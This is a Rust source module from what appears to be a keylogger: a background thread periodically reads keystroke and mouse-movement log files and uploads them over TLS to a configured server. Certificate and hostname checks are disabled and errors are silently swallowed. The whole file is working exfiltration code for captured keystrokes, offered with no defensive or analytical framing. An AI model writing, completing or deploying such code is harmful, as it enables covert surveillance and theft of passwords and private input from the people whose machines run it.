use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::time::Duration;
use std::sync::{Arc, Mutex};
use std::thread;
use std::net::TcpStream;
use native_tls::TlsConnector;

pub struct UploaderConfig {
    pub server_address: String,
    pub send_interval_seconds: u64,
}

impl UploaderConfig {
    pub fn new(server_address: String, send_interval_seconds: u64) -> Self {
        Self {
            server_address,
            send_interval_seconds,
        }
    }
}

pub fn send_file(server_address: &str, file_path: &str) -> bool {
    // Catch any errors silently
    let result = std::panic::catch_unwind(|| {
        send_file_internal(server_address, file_path)
    });
    
    result.unwrap_or(false)
}

fn send_file_internal(server_address: &str, file_path: &str) -> bool {
    if !Path::new(file_path).exists() {
        return false;
    }

    // Extract filename from path
    let filename = match Path::new(file_path).file_name().and_then(|n| n.to_str()) {
        Some(name) => name,
        None => return false,
    };

    // Read file contents
    let mut file = match File::open(file_path) {
        Ok(f) => f,
        Err(_) => return false,
    };

    let mut contents = Vec::new();
    if file.read_to_end(&mut contents).is_err() {
        return false;
    }

    // Connect with TLS
    let connector = match TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build() {
        Ok(c) => c,
        Err(_) => return false,
    };

    let stream = match TcpStream::connect(server_address) {
        Ok(s) => s,
        Err(_) => return false,
    };
    
    // Set timeouts
    let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(10)));

    let mut tls_stream = match connector.connect("localhost", stream) {
        Ok(s) => s,
        Err(_) => return false,
    };

    // Send filename
    if tls_stream.write_all(format!("{}\n", filename).as_bytes()).is_err() {
        return false;
    }

    // Send file contents
    if tls_stream.write_all(&contents).is_err() {
        return false;
    }

    let _ = tls_stream.flush();
    drop(tls_stream);
    true
}

pub fn start_periodic_uploader(config: UploaderConfig, running: Arc<Mutex<bool>>) {
    thread::spawn(move || {
        loop {
            thread::sleep(Duration::from_secs(config.send_interval_seconds));

            let should_continue = match running.lock() {
                Ok(guard) => *guard,
                Err(_) => break,
            };
            
            if !should_continue {
                break;
            }

            let keylog_path = crate::logger::get_keylog_path();
            let mouselog_path = crate::logger::get_mouselog_path();
            
            if let Some(path_str) = keylog_path.to_str() {
                let _ = send_file(&config.server_address, path_str);
            }
            
            if let Some(path_str) = mouselog_path.to_str() {
                let _ = send_file(&config.server_address, path_str);
            }
        }
    });
}

